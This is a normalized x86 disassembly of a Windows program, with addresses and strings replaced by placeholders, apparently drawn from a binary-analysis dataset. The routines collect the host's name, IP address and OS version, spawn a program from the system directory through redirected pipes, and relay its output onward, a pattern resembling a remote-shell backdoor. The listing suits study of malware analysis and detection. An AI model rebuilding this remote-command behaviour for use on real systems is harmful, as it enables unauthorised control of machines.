mov [ ebp + 0x8304 ] bl
mov [ ebp + 0x8308 ] bl
mov [ ebp + 0x8334 ] esi
call sub_422332
push [ ebp - 0x7c ]
push [ ebp - 0x78 ]
push [ ebp - 0x80 ]
call sub_4285a0
push [ ebp - 0x78 ]
call sub_424869
mov ecx [ ebp + 0x10338 ]
add esp 0x10
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
add ebp 0x1033c
leave
retn
sub_402347
push ebp
lea ebp [ esp - 0x1a33c ]
mov eax 0x1a3bc
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1a338 ] eax
mov eax [ ebp + 0x1a348 ]
push ebx
push esi
push edi
xor ebx ebx
push 0x7fff
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x8339 ]
push ebx
push eax
mov esi ecx
mov [ ebp + 0x8338 ] bl
call sub_42b5a0
mov eax [ ebp + 0x1a344 ]
mov [ ebp + 0x8318 ] eax
lea eax [ ebp - 0x78 ]
mov [ ebp + 0x831c ] eax
lea eax [ ebp - 0x7c ]
mov [ ebp + 0x8328 ] eax
xor eax eax
mov [ ebp + 0x8302 ] ax
mov [ ebp + 0x8306 ] ax
add esp 0xc
lea eax [ ebp - 0x74 ]
mov [ ebp + 0x8320 ] esi
mov [ ebp + 0x832c ] ebx
mov [ ebp + 0x8330 ] ebx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x7c ] ebx
mov [ ebp + 0x8304 ] bl
mov [ ebp + 0x8308 ] bl
mov [ ebp - 0x74 ] esi
mov [ ebp + 0x8334 ] 0x1
call sub_4220d1
mov esi 0x8000
cmp [ ebp - 0x7c ] esi
jae r-xdata
push [ ebp - 0x78 ]
call sub_424869
pop ecx
push [ ebp - 0x7c ]
lea eax [ ebp + 0x8338 ]
push [ ebp - 0x78 ]
push eax
call sub_4285a0
push [ ebp - 0x78 ]
call sub_424869
push 0x9fff
lea eax [ ebp + 0x10339 ]
push ebx
push eax
mov [ ebp - 0x78 ] ebx
mov [ ebp + 0x10338 ] bl
call sub_42b5a0
push [ ebp - 0x7c ]
lea eax [ ebp + 0x8338 ]
push eax
lea edi [ ebp + 0x10338 ]
call sub_402153
mov edi eax
add esp 0x24
cmp edi esi
jae r-xdata
or eax 0xffffffff
push edi
lea eax [ ebp + 0x10338 ]
push eax
push [ ebp - 0x80 ]
call sub_4285a0
add esp 0xc
mov eax edi
jmp r-xdata
mov ecx [ ebp + 0x1a338 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
add ebp 0x1a33c
leave
retn
sub_402490
push ebp
mov ebp esp
mov eax 0x12810
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x12810 ] eax
mov eax [ ebp + 0xc ]
mov edi 0x7fff
push edi
mov [ ebp - 0x1280c ] eax
xor ebx ebx
lea eax [ ebp - 0x10003 ]
push ebx
push eax
mov esi ecx
call sub_42b5a0
push edi
lea eax [ ebp - 0x8003 ]
push ebx
push eax
mov [ ebp - 0x8004 ] bl
call sub_42b5a0
push 0x13
pop edi
push esi
push [ ebp - 0x12810 ]
lea eax [ ebp - 0x12804 ]
push eax
mov [ ebp - 0x12808 ] esi
call sub_4285a0
lea eax [ esi + 0x4 ]
push eax
lea eax [ ebp - 0x12808 ]
push eax
lea eax [ ebp - 0xfffc ]
push eax
mov [ ebp - 0x10004 ] edi
mov [ ebp - 0x10000 ] ebx
call sub_4285a0
lea eax [ ebp - 0x8004 ]
push eax
lea eax [ ebp - 0x10004 ]
lea ecx [ esi + 0xc ]
push eax
call sub_402347
mov ecx [ ebp - 0x1280c ]
mov esi eax
add esp 0x38
lea eax [ ebp - 0x8004 ]
push eax
call sub_40409c
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub_402564
push ebp
mov ebp esp
mov eax 0x12810
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x12810 ] eax
mov eax [ ebp + 0xc ]
mov edi 0x7fff
push edi
mov [ ebp - 0x1280c ] eax
xor ebx ebx
lea eax [ ebp - 0x10003 ]
push ebx
push eax
mov esi ecx
call sub_42b5a0
push edi
lea eax [ ebp - 0x8003 ]
push ebx
push eax
mov [ ebp - 0x8004 ] bl
call sub_42b5a0
push 0x15
pop edi
push esi
push [ ebp - 0x12810 ]
lea eax [ ebp - 0x12804 ]
push eax
mov [ ebp - 0x12808 ] esi
call sub_4285a0
lea eax [ esi + 0x4 ]
push eax
lea eax [ ebp - 0x12808 ]
push eax
lea eax [ ebp - 0xfffc ]
push eax
mov [ ebp - 0x10004 ] edi
mov [ ebp - 0x10000 ] ebx
call sub_4285a0
lea eax [ ebp - 0x8004 ]
push eax
lea eax [ ebp - 0x10004 ]
lea ecx [ esi + 0xc ]
push eax
call sub_402347
mov ecx [ ebp - 0x1280c ]
mov esi eax
add esp 0x38
lea eax [ ebp - 0x8004 ]
push eax
call sub_40409c
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub_402638
push ebp
mov ebp esp
mov eax 0x12938
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x12934 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x12930 ] eax
mov eax [ ebp + 0x10 ]
push 0x291c
mov [ ebp - 0x12938 ] eax
xor ebx ebx
lea eax [ ebp - 0x1292c ]
push ebx
push eax
mov edi ecx
call sub_42b5a0
mov esi 0x7fff
push esi
lea eax [ ebp - 0x1000b ]
push ebx
push eax
call sub_42b5a0
push esi
lea eax [ ebp - 0x800b ]
push ebx
push eax
mov [ ebp - 0x800c ] bl
call sub_42b5a0
mov eax [ ebp - 0x12930 ]
add esp 0x24
mov [ ebp - 0x12814 ] edi
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push [ ebp - 0x12930 ]
lea eax [ ebp - 0x1292c ]
push eax
call sub_4285a0
add esp 0xc
lea eax [ ebp - 0x12810 ]
cmp edi 0xffffffff
jne r-xdata
push edi
push [ ebp - 0x12934 ]
push eax
call sub_4285a0
push 0x18
pop eax
mov [ ebp - 0x1000c ] eax
lea eax [ edi + 0x11c ]
push eax
lea eax [ ebp - 0x1292c ]
push eax
lea eax [ ebp - 0x10004 ]
push eax
mov [ ebp - 0x10008 ] ebx
call sub_4285a0
lea eax [ ebp - 0x800c ]
push eax
lea eax [ ebp - 0x1000c ]
lea ecx [ edi + 0x124 ]
push eax
call sub_402347
add esp 0x20
push ebx
push [ ebp - 0x12934 ]
push eax
call sub_4285a0
push 0x18
pop eax
mov [ ebp - 0x1000c ] eax
push 0x47
pop ecx
lea eax [ ebp - 0x800c ]
push eax
mov [ ebp - 0x10008 ] ebx
lea esi [ ebp - 0x1292c ]
lea edi [ ebp - 0x10004 ]
lea eax [ ebp - 0x1000c ]
[ edi ] [ esi ]
push eax
mov ecx 0x124
call sub_402347
add esp 0x14
jmp r-xdata
mov ecx [ ebp - 0x12938 ]
mov esi eax
lea eax [ ebp - 0x800c ]
push eax
call sub_40409c
mov ecx [ ebp - 0x8 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub_4027a7
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
push 0x124f80
push eax
mov [ rw-data ] eax
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0xa4cb80
mov [ rw-data ] 0x1
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn 0x4
push eax
call [ CloseHandle@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_4027fc
push ebp
lea ebp [ esp - 0x2820 ]
mov eax 0x2820
call sub_436f80
push 0xffffffff
push sub_43e7ee
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x281c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x2828 ]
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp + 0x18 ] 0xf
call sub_404490
push ebx
push ebx
push 0x1
mov [ ebp - 0x4 ] ebx
push ebx
mov [ ebp - 0x10 ] ebx
call [ CreateEventA@IAT ]
push ebx
mov [ rw-data ] eax
push eax
jmp r-xdata
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
push ebx
push 0x1
lea ecx [ ebp ]
mov [ rw-data ] ebx
call sub_40415f
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x281c ]
xor ecx ebp
call sub_4234de
add ebp 0x2820
leave
retn 0x4
cmp [ ebp - 0x10 ] ebx
jne r-xdata
push 0x27ff
lea eax [ ebp + 0x1d ]
push ebx
push eax
mov [ ebp + 0x1c ] bl
call sub_42b5a0
add esp 0xc
cmp [ ebp - 0x10 ] 0x2800
jbe r-xdata
push 0x5dc
call [ Sleep@IAT ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp + 0x1c ]
push eax
push [ rw-data ]
mov [ ebp - 0x14 ] ebx
call [ ReadFile@IAT ]
lea eax [ ebp + 0x1c ]
lea esi [ eax + 0x1 ]
mov [ ebp - 0x10 ] 0x279c
push ebx
push [ rw-data ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
sub eax esi
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
sub_402986
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43e7b0
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x8264
call sub_436f80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8278 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] 0xf
call sub_404490
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x8290 ] ebx
call [ CreateEventA@IAT ]
mov edi 0xff
push edi
mov [ rw-data ] eax
lea eax [ esp + 0x71 ]
push ebx
push eax
mov [ esp + 0x78 ] bl
call sub_42b5a0
add esp 0xc
push edi
lea eax [ esp + 0x171 ]
push ebx
push eax
mov [ esp + 0x178 ] bl
call sub_42b5a0
add esp 0xc
push 0x7
pop ecx
xor eax eax
mov [ esp + 0x4c ] bl
lea edi [ esp + 0x4d ]
[ edi ]
stosw [ edi ]
push 0x7fff
stosb [ edi ]
lea eax [ esp + 0x271 ]
push ebx
push eax
mov [ esp + 0x278 ] bl
call sub_42b5a0
lea eax [ esi + 0x200 ]
lea edi [ esp + 0x58 ]
add esp 0xc
sub edi eax
mov cl [ eax ]
mov [ edi + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ esi + 0x100 ]
lea edx [ esp + 0x16c ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea edx [ esp + 0x6c ]
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ esp + 0x4c ]
push eax
call sub_423a43
mov edi eax
lea eax [ esp + 0x170 ]
mov [ esp ] r--data
push eax
call sub_423e30
push ebx
push edi
push eax
mov [ esp + 0x24 ] eax
call sub_424424
add esp 0x14
mov edi r--data
push [ esp + 0x10 ]
call sub_42462f
mov [ esp ] 0x8000
lea eax [ esp + 0x270 ]
push ebx
push eax
call sub_42b5a0
add esp 0xc
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x70 ]
push eax
lea eax [ esp + 0x274 ]
push eax
or ecx 0xffffffff
call sub_402638
add esp 0xc
push edi
lea ecx [ esp + 0x18 ]
call sub_403dc1
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x8284 ] 0x2
mov esi [ esi + 0x220 ]
mov eax [ esi ]
lea ecx [ esp + 0x34 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ esp + 0x1c ]
call sub_40415f
push ebx
push 0x1
lea ecx [ esp + 0x38 ]
call sub_40415f
xor eax eax
mov ecx [ esp + 0x8278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x8260 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x4
push 0x3e8
call [ Sleep@IAT ]
lea eax [ esp + 0x30 ]
call sub_403e09
push 0x8000
lea eax [ esp + 0x270 ]
push ebx
push eax
call sub_42b5a0
add esp 0xc
push [ esp + 0x10 ]
lea eax [ esp + 0x270 ]
push 0x2000
push 0x1
push eax
call sub_4240e7
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x80 ]
push ecx
lea ecx [ esp + 0x284 ]
push ecx
mov ecx eax
call sub_402638
add esp 0x1c
push edi
lea ecx [ esp + 0x18 ]
call sub_403dc1
lea edx [ esp + 0x14 ]
mov [ esp + 0x8280 ] 0x1
mov ecx [ esi + 0x220 ]
mov eax [ ecx ]
push edx
lea edx [ esp + 0x34 ]
push edx
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x8288 ] bl
call sub_40415f
push [ esp + 0x10 ]
call sub_4235e5
pop ecx
test eax eax
je r-xdata
push ebx
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
sub_402c37
mov eax [ rw-data ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push edi
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov [ rw-data ] edi
push edi
push [ rw-data ]
call [ TerminateProcess@IAT ]
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
pop edi
pop esi
retn
push eax
call esi
mov [ rw-data ] edi
sub_402cc9
push 0x158
mov eax sub_43e767
call sub_425e16
mov esi ecx
xor ebx ebx
push ebx
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x90 ] 0xf
call sub_404490
push 0x3f
lea eax [ ebp - 0x6f ]
push ebx
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp - 0x70 ] bl
call sub_42b5a0
add esp 0xc
push 0x7
pop ecx
xor eax eax
mov [ ebp - 0x30 ] bl
lea edi [ ebp - 0x2f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
lea eax [ ebp - 0x70 ]
push eax
call gethostname
lea eax [ ebp - 0x70 ]
push eax
call gethostbyname
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
mov [ ebp - 0x148 ] eax
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x144 ] 0x9c
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov edi r--data
push edi
lea ecx [ ebp - 0x8c ]
call sub_403dc1
lea eax [ ebp - 0x70 ]
push eax
push r--data
lea eax [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x1
call sub_40202a
push [ ebp - 0x148 ]
lea eax [ ebp - 0x8c ]
push r--data
call sub_40202a
push [ ebp - 0x13c ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x140 ]
push r--data
push eax
call sub_42354a
lea eax [ ebp - 0x30 ]
push eax
push r--data
lea eax [ ebp - 0x8c ]
call sub_40202a
push r--data
push r--data
lea eax [ ebp - 0x8c ]
call sub_40202a
mov eax [ ebp - 0x88 ]
add esp 0x30
cmp [ ebp - 0x74 ] 0x10
jae r-xdata
mov [ ebp - 0xa9 ] 0xff
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx [ ebp - 0x78 ]
push eax
call sub_402490
pop ecx
pop ecx
push edi
lea ecx [ ebp - 0x164 ]
call sub_403dc1
lea ecx [ ebp - 0x164 ]
push ecx
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x164 ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0x8c ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0xa8 ]
call sub_40415f
mov eax esi
call sub_425e60
retn
lea eax [ ebp - 0x88 ]
sub_402e5f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43e718
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x8048
call sub_436f80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8044 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8058 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] 0xf
call sub_404490
mov [ esp + 0x8060 ] ebx
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
push 0x7fff
lea eax [ esp + 0x51 ]
push ebx
mov [ esp + 0x8068 ] 0x1
push eax
mov [ esp + 0x58 ] bl
call sub_42b5a0
add esp 0xc
lea esi [ esp + 0xc ]
call sub_4228a5
lea eax [ esp + 0x4c ]
push eax
mov ebx esi
call sub_4226d9
lea eax [ esp + 0x4c ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x50 ]
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ esp + 0x18 ]
call sub_403dc1
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x8064 ] 0x2
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x8 ]
xor esi esi
push esi
push 0x1
lea ecx [ esp + 0x1c ]
call sub_40415f
cmp [ esp + 0x10 ] esi
jne r-xdata
push esi
push 0x1
lea ecx [ esp + 0x38 ]
call sub_40415f
xor eax eax
inc eax
mov ecx [ esp + 0x8058 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x8044 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn
push esi
call sub_424869
pop ecx
sub_402f91
push ebp
sub esp 0x238
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x238 ] eax
push 0x28
mov eax sub_43e6cf
call sub_425dad
mov eax [ ebp + 0x244 ]
mov edi ecx
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x18 ] eax
mov [ ebp + 0x18 ] 0xf
call sub_404490
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
lea esi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_4228a5
push 0x1ff
lea eax [ ebp + 0x39 ]
push ebx
push eax
mov [ ebp + 0x38 ] bl
call sub_42b5a0
push [ edi + 0x8 ]
add edi 0xc
lea eax [ ebp + 0x38 ]
push edi
push eax
call sub_4285a0
lea eax [ ebp + 0x38 ]
push eax
call sub_423a43
add esp 0x1c
cmp eax ebx
jne r-xdata
push eax
call sub_422a55
lea eax [ ebp + 0x38 ]
push eax
mov eax esi
call sub_422aa6
jmp r-xdata
push r--data
push r--data
jmp r-xdata
push ebx
lea ecx [ ebp + 0x1c ]
mov esi eax
mov [ ebp + 0x34 ] 0xf
call sub_404490
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0x1c ]
cmp esi ebx
je r-xdata
lea ecx [ ebp ]
push ecx
mov ecx [ ebp + 0x30 ]
push eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x34 ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x3
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x34 ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp - 0x10 ] ebx
jne r-xdata
lea eax [ ebp + 0x20 ]
call sub_40409c
cmp [ ebp + 0x34 ] 0x10
mov eax [ ebp + 0x20 ]
jae r-xdata
push ebx
push esi
lea ecx [ ebp ]
call sub_40415f
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x238 ]
xor ecx ebp
call sub_4234de
add ebp 0x23c
leave
retn
push ebx
call sub_424869
pop ecx
sub_4030e8
push ebp
sub esp 0x238
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x238 ] eax
push 0x20
mov eax sub_43e687
call sub_425dad
mov eax [ ebp + 0x244 ]
push 0xf
pop edi
mov esi ecx
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x10 ] eax
mov [ ebp + 0x18 ] edi
call sub_404490
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x34 ] edi
call sub_404490
push 0x1ff
lea eax [ ebp + 0x39 ]
push ebx
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp + 0x38 ] bl
call sub_42b5a0
push [ esi + 0x8 ]
add esi 0xc
lea eax [ ebp + 0x38 ]
push esi
push eax
call sub_4285a0
lea eax [ ebp + 0x38 ]
push eax
call sub_424554
fld [ r--data ]
fmul st1
add esp 0x1c
fmulp st1
fmul [ r--data ]
call sub_43a576
push r--data
lea ecx [ ebp + 0x1c ]
mov [ rw-data ] eax
call sub_40409c
cmp [ ebp + 0x34 ] 0x10
mov eax [ ebp + 0x20 ]
jae r-xdata
lea ecx [ ebp ]
push ecx
mov ecx [ ebp + 0x30 ]
push eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp + 0x1c ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp ]
call sub_40415f
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x238 ]
xor ecx ebp
call sub_4234de
add ebp 0x23c
leave
retn
lea eax [ ebp + 0x20 ]
sub_403212
push 0x58
mov eax sub_43e64a
call sub_425e16
push 0xf
pop edi
xor esi esi
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] edi
call sub_404490
mov [ ebp - 0x4 ] esi
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] edi
call sub_404490
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x2c ]
mov [ rw-data ] esi
call sub_40409c
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x18 ]
push eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
lea ecx [ ebp - 0x64 ]
push ecx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x8 ]
xor edi edi
push esi
inc edi
push edi
lea ecx [ ebp - 0x64 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_40415f
mov eax edi
call sub_425e60
retn
lea eax [ ebp - 0x28 ]
sub_4032b9
push ebp
sub esp 0x61c
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x61c ] eax
push 0x80
mov eax sub_43ebc7
call sub_425dad
mov eax [ ebp + 0x628 ]
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x10 ] eax
mov [ ebp + 0x18 ] 0xf
call sub_404490
push 0x3ff
lea eax [ ebp + 0x1d ]
push ebx
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp + 0x1c ] bl
call sub_42b5a0
push 0x1ff
lea eax [ ebp + 0x41d ]
push ebx
push eax
mov [ ebp + 0x41c ] bl
call sub_42b5a0
add esp 0x18
push 0x200
lea eax [ ebp + 0x41c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea edi [ ebp + 0x41c ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
call sub_402c37
mov esi [ CreatePipe@IAT ]
push ebx
lea eax [ ebp - 0x1c ]
push eax
xor edi edi
push rw-data
inc edi
push rw-data
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edi
call esi
push ebx
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push rw-data
call esi
lea eax [ ebp - 0x60 ]
push eax
call [ GetStartupInfoA@IAT ]
xor eax eax
mov [ ebp - 0x30 ] ax
mov [ ebp - 0x2e ] ax
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push ebx
push ebx
push ebx
push edi
push ebx
push ebx
lea eax [ ebp + 0x41c ]
push eax
push ebx
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x34 ] 0x101
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp + 0x1c ]
push r--data
push eax
call sub_42354a
add esp 0xc
mov eax [ ebp - 0x70 ]
push [ ebp - 0x6c ]
mov [ rw-data ] eax
call [ CloseHandle@IAT ]
push 0x64
call [ Sleep@IAT ]
push ebx
push ebx
push [ ebp - 0x10 ]
push sub_4027fc
push ebx
push ebx
call sub_423b4f
mov [ rw-data ] eax
lea eax [ ebp + 0x1c ]
push r--data
push eax
call sub_42354a
add esp 0x20
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x8c ]
call sub_403dc1
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
push ebx
push edi
lea ecx [ ebp - 0x8c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp ]
call sub_40415f
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x61c ]
xor ecx ebp
call sub_4234de
add ebp 0x620
leave
retn
lea eax [ ebp + 0x1c ]
lea edx [ eax + 0x1 ]
sub_4034db
push 0x244
mov eax sub_43e60a
call sub_425e16
mov eax [ ebp + 0x8 ]
mov ebx ecx
push 0x0
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x230 ] 0xf
call sub_404490
and [ ebp - 0x4 ] 0x0
mov esi r--data
